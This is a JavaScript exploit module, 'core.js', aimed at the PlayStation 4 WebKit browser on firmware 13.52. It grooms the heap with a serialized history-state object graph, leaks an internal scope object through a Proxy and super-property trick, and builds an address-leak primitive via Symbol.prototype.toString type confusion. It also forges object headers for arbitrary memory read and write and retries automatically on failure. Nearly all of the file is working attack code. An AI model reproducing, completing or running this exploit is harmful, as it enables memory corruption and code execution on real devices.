// language: JavaScript, file: core.js, target: PlayStation 4 WebKit (FW 13.52)

let DRAIN_COUNT = 512;
const AUTO_RETRY_DELAY_MS = 50;

const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

const CARRIER_SLOTS = (function () {
  try {
    const q = new URLSearchParams(location.search).get("slots");
    const n = q ? parseInt(q, 10) : 0;
    if (n >= 100000 && n <= 40000000) return n;
  } catch (e) {}
  return 12000000;
})();
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = 50;
const COMPOSE_DELAY_MS = 100;

const symbolToString = Symbol.prototype.toString;

const _gOverride = (function () {
  const out = {};
  try {
    const q = new URLSearchParams(location.search).getAll("g");
    for (const item of q) {
      const [k, v] = item.split(":");
      const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
      if (k && n > 0) out[k] = n;
    }
  } catch (e) {}
  return out;
})();
const _g = (name, dflt) =>
  typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;

const DRAIN_SIZE = _g("drainsz", 0x10000);
const SLAB_SIZE = _g("slab", 0x400000);
const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
const SEPARATOR_SIZE = _g("sep", 0x10000);
const EARLY_HOLE_SIZE = _g("early", 0x70000);
const GUARD_SIZE = _g("guard", 0x90000);
const PREDECESSOR_SIZE = _g("pred", 0x80000);
const FINAL_HOLE_SIZE = _g("final", 0x80000);

const RW_BUFFER_SIZE = 0x100;
const IDENT_OFFSET = 0x20;

const REVISION = "slopkit-core-1";
const attemptKey = `${REVISION}:attempts`;
const burstKey = `${REVISION}:burst`;

const rwHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const identityMagic = new Uint8Array([
  0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,
]);
const identityBytes = new Uint8Array(8);

let attemptNumber = 0;
let attemptCeiling = 0;
let keepIndex = 0;
let stopped = false;
let keepAlive = null;
let onEvent = null;
let criticalBarrier = null;
let settleResolve = null;
let settleReject = null;
let running = false;

let referenceTarget = null;
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
const nativeTarget = parseInt;
let fakeHost = null;
let lengthWord = null;
let anchorElement = null;
let markerObjectA = null;
let markerObjectB = null;
let targetHolder = null;
let holderGuardA = null;
let holderGuardB = null;
let fillerGraph = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let captureError = null;

let predecessorWords = null;
let pointerLow = 0;
let pointerHigh = 0;
let targetAddress = NaN;
let nativeTargetAddress = NaN;
let anchorElementAddress = NaN;
let markerAAddress = NaN;
let markerBAddress = NaN;

let rwOriginalVector = NaN;
let rwHeaderOK = false;
let holderHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;
let functionStructureID = 0;
let nativeExecutableStructureID = 0;
let executableAddress = NaN;
let nativeFunctionAddress = NaN;
let nativeConstructorAddress = NaN;
let pointersRepeated = false;
let restoreObserved = false;
let retrySafe = false;
let retryScheduled = false;
let attemptPersisted = false;
let candidateEverReturned = false;
let candidateMutationStarted = false;
let zeroHeaderMiss = false;
let identityResult = 0;

let compositionState = 0;
let compositionLength = 0;
let compositionError = null;
let liveCandidate = null;
let fakeReleased = false;

const UNSEEN = -1;
const profile = {
  carrierSID: UNSEEN,
  carrierType: UNSEEN,
  carrierFlags: UNSEEN,
  carrierMode: UNSEEN,
  carrierByte28: UNSEEN,
  holderSID: UNSEEN,
  holderType: UNSEEN,
  holderFlags: UNSEEN,
  functionSID: UNSEEN,
  functionType: UNSEEN,
  functionFlags: UNSEEN,
  nativeExecSID: UNSEEN,
  nativeExecType: UNSEEN,
  nativeExecFlags: UNSEEN,
  cellSize: UNSEEN,
  vectorOffset: 0x10,
  inlineSlotOffset: 0x10,
  butterflyOffset: 0x08,
  vectorOffsetMeasured: false,
};

function resetProfile() {
  profile.carrierSID = UNSEEN;
  profile.carrierType = UNSEEN;
  profile.carrierFlags = UNSEEN;
  profile.carrierMode = UNSEEN;
  profile.carrierByte28 = UNSEEN;
  profile.holderSID = UNSEEN;
  profile.holderType = UNSEEN;
  profile.holderFlags = UNSEEN;
  profile.functionSID = UNSEEN;
  profile.functionType = UNSEEN;
  profile.functionFlags = UNSEEN;
  profile.nativeExecSID = UNSEEN;
  profile.nativeExecType = UNSEEN;
  profile.nativeExecFlags = UNSEEN;
}

function hex(value) {
  return `0x${value.toString(16)}`;
}

function buffer(size) {
  return new ArrayBuffer(size);
}

// Required Exports for mem.js and Heap Management
export function releaseFakeCell() {
  fakeReleased = true;
}

export function fakeCellReleased() {
  return fakeReleased;
}

export function carrierHeaderCopy(destination, source, count) {
  for (let i = 0; i < count; ++i) destination[i] = source[i];
}

export function carrierHomeVector() {
  return rwOriginalVector;
}

export function clearHeap() {
  for (let i = 0; i < 10; i++) {
    new ArrayBuffer(0x100000);
  }
  if (typeof window !== "undefined" && window.gc) {
    window.gc();
  }
}

function allZero(bytes, start, end) {
  for (let i = start; i < end; ++i) {
    if (bytes[i] !== 0) return false;
  }
  return true;
}

function uint32At(bytes, offset) {
  return (
    bytes[offset] +
    bytes[offset + 1] * 0x100 +
    bytes[offset + 2] * 0x10000 +
    bytes[offset + 3] * 0x1000000
  );
}

function low48At(bytes, offset) {
  return (
    bytes[offset] +
    bytes[offset + 1] * 0x100 +
    bytes[offset + 2] * 0x10000 +
    bytes[offset + 3] * 0x1000000 +
    bytes[offset + 4] * 0x100000000 +
    bytes[offset + 5] * 0x10000000000
  );
}

function readBytes(destination, source, count) {
  for (let i = 0; i < count; ++i) destination[i] = source[i];
}

function sameBytes(left, right, count) {
  for (let i = 0; i < count; ++i) {
    if (left[i] !== right[i]) return false;
  }
  return true;
}

function readTwiceMatches(destination, source, count) {
  readBytes(destination, source, count);
  return sameBytes(destination, source, count);
}

function aimCarrier(candidate, address) {
  const high = Math.floor(address / 0x100000000);
  scratchWords[0] = address - high * 0x100000000;
  scratchWords[1] = high;
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
  if (words[offset + 3] !== 0) return NaN;
  return (
    words[offset] +
    words[offset + 1] * 0x10000 +
    words[offset + 2] * 0x100000000
  );
}

function plausibleCell(value) {
  return (
    value > 0x100000000 &&
    value <= 0xffffffffffff &&
    value <= 9007199254740991 &&
    Math.floor(value) === value &&
    value % 8 === 0
  );
}

function plausibleAddress(value) {
  return (
    value > 0x100000000 &&
    value <= 0xffffffffffff &&
    value <= 9007199254740991 &&
    Math.floor(value) === value
  );
}

function canonicalLow48(bytes, offset) {
  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function encodedHeaderNumber() {
  const raw = new ArrayBuffer(8);
  const u32 = new Uint32Array(raw);
  const f64 = new Float64Array(raw);
  u32[0] = 0x00004250;
  u32[1] = 0x01062800;
  return f64[0];
}

function emit(tag, detail) {
  if (onEvent === null) return;
  try {
    onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber);
  } catch {}
}

function checkCarrierIdentity(candidate) {
  if (
    !plausibleAddress(rwOriginalVector) ||
    rwOriginalVector % 8 !== 0 ||
    IDENT_OFFSET + 8 > RW_BUFFER_SIZE
  )
    return 0;
  aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
  readBytes(identityBytes, rwView, 8);
  restoreCarrier(candidate);
  return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c
    ? 1
    : -1;
}

function runIdentityProof(candidate) {
  candidateMutationStarted = true;
  identityResult = checkCarrierIdentity(candidate);
  return identityResult === 1;
}

function ceilingReached() {
  return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
}

function giveUp(reason) {
  stopped = true;
  emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
  const reject = settleReject;
  settleResolve = null;
  settleReject = null;
  running = false;
  if (reject !== null)
    reject(
      new Error(`core: gave up after ${attemptNumber} attempts (${reason})`),
    );
}

function failed() {
  if (ceilingReached()) {
    giveUp("attempt-ceiling");
    return;
  }
  emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
  stopped = false;
  retryScheduled = false;
  setTimeout(() => {
    try {
      history.replaceState(null, "");
    } catch {}
    attemptNumber++;
    startAttempt();
  }, AUTO_RETRY_DELAY_MS);
}

function releaseAttemptAllocations() {
  referenceTarget = null;
  rwBuffer = null;
  rwView = null;
  rwMirror = null;
  targetBuffer = null;
  targetView = null;
  fakeHost = null;
  lengthWord = null;
  anchorElement = null;
  markerObjectA = null;
  markerObjectB = null;
  targetHolder = null;
  holderGuardA = null;
  holderGuardB = null;
  fillerGraph = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  predecessorWords = null;
  keepAlive = null;
  try {
    history.replaceState(null, "");
  } catch {}
  if (typeof globalThis.gc === "function") {
    try {
      globalThis.gc();
    } catch {}
  }
}

function resetAttemptState() {
  referenceTarget = null;
  rwBuffer = null;
  rwView = null;
  rwMirror = null;
  targetBuffer = null;
  targetView = null;
  fakeHost = null;
  lengthWord = null;
  anchorElement = null;
  markerObjectA = null;
  markerObjectB = null;
  targetHolder = null;
  holderGuardA = null;
  holderGuardB = null;
  fillerGraph = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  copiedLength = 0;
  captureState = 0;
  captureError = null;
  predecessorWords = null;
  keepAlive = new Array(DRAIN_COUNT + 3);
  keepIndex = 0;
  pointerLow = 0;
  pointerHigh = 0;
  targetAddress = NaN;
  nativeTargetAddress = NaN;
  anchorElementAddress = NaN;
  markerAAddress = NaN;
  markerBAddress = NaN;
  rwOriginalVector = NaN;
  rwHeaderOK = false;
  holderHeaderOK = false;
  functionHeaderOK = false;
  nativeExecutableHeaderOK = false;
  functionStructureID = 0;
  nativeExecutableStructureID = 0;
  executableAddress = NaN;
  nativeFunctionAddress = NaN;
  nativeConstructorAddress = NaN;
  pointersRepeated = false;
  restoreObserved = false;
  retrySafe = false;
  retryScheduled = false;
  candidateEverReturned = false;
  candidateMutationStarted = false;
  zeroHeaderMiss = false;
  identityResult = 0;
  identityBytes.fill(0);
  compositionState = 0;
  compositionLength = 0;
  compositionError = null;
  liveCandidate = null;
  resetProfile();
  rwHeader.fill(0);
  targetHeader.fill(0);
  holderHeader.fill(0);
}

function startAttempt() {
  if (fakeReleased) return;
  if (stopped) return;
  resetAttemptState();
  try {
    sessionStorage.setItem(attemptKey, String(attemptNumber));
    attemptPersisted =
      sessionStorage.getItem(attemptKey) === String(attemptNumber);
  } catch {}
  emit(
    "ATTEMPT-START",
    `attempt-persisted=${attemptPersisted}` +
      `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
  );
  try {
    clearHeap();
    buildAndStoreGraph();

    for (let i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
    prepareAddrof();
  } catch (error) {
    finishEarlySafeAttempt(
      "SETUP-THREW",
      `${error?.name}:${String(error?.message).slice(0, 80)}`,
      "setup-threw",
    );
  }
}

function leakScopeObject() {
  class Leaker {
    leak() {
      return super.foo;
    }
  }
  Leaker.prototype.__proto__ = new Proxy(
    {},
    {
      get: function (target, property, receiver) {
        return receiver;
      },
    },
  );
  const leak = Leaker.prototype.leak;
  return (function () {
    return leak();
  })();
}

function prepareSymbolWrapper(F) {
  leakedScope = leakScopeObject();
  if (leakedScope === undefined || leakedScope === null)
    throw new Error("scope-not-leaked");

  for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;

  Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
  return Object(leakedScope.g);
}

function buildFakeHost() {
  rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
  rwView = new Uint8Array(rwBuffer);
  rwMirror = new Uint8Array(rwBuffer);
  rwMirror[0] = 0x3c;

  targetBuffer = new ArrayBuffer(0x20);
  targetView = new Uint8Array(targetBuffer);
  targetView[0] = 0xa5;
  lengthWord = { keep: 0x51515151 };

  fakeHost = {
    q0: encodedHeaderNumber(),
    q1: 1.1,
    q2: rwView,
    q3: lengthWord,
    q4: 2.2,
    q5: 3.3,
  };

  delete fakeHost.q1;
  delete fakeHost.q4;
  delete fakeHost.q5;

  anchorElement = document.createElement("textarea");
  markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
  markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
  holderGuardA = { marker: 0x484f4c44 };
  holderGuardB = { marker: 0x47554152 };
  targetHolder = {
    q0: nativeTarget,
    q1: anchorElement,
    q2: markerObjectA,
    q3: markerObjectB,
    q4: holderGuardA,
    q5: holderGuardB,
  };
}

function buildAndStoreGraph() {
  referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
  buildFakeHost();

  fillerGraph = new Array(0xfffd);
  let pos = 0;
  const huge = 1n << 40n;
  for (let b = 0; b < FILLER_BIGINTS; ++b)
    fillerGraph[pos++] = huge + BigInt(b);
  for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};

  outerGraph = new Array(CONTROL_INDEX + 1);
  outerGraph[0] = fillerGraph;
  outerGraph[1] = referenceTarget;
  outerGraph[2] = referenceTarget;
  outerGraph[CONTROL_INDEX] = CONTROL_INT;

  history.replaceState(outerGraph, "");
}

function prepareAddrof() {
  capturedWords = new Uint16Array(16);
  getterCarrier = function getterCarrierFunction() {
    return 7;
  };

  getterCarrier[0] = fakeHost;
  for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
  getterCarrier[1] = targetHolder;
  getterCarrier[2] = fakeHost;
  getterCarrier[3] = targetHolder;

  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);

  setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
}

function runAddrofCapture() {
  try {
    capturedString = symbolToString.call(preparedSymbolObject);
    copiedLength = capturedString.length;
    for (let i = 0; i < 16; i++)
      capturedWords[i] = capturedString.charCodeAt(7 + i);
    captureState = 1;
  } catch (error) {
    captureError = error;
    captureState = -1;
  }
}
